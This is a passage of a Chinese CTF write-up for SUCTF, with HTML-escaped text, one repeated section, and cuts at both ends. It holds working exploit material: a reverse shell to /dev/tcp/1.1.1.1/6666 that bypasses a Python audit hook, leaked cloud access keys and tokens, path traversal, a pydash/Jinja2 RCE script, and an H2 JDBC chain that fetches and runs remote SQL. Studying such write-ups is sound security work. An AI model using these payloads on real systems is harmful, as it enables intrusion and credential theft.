\u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return 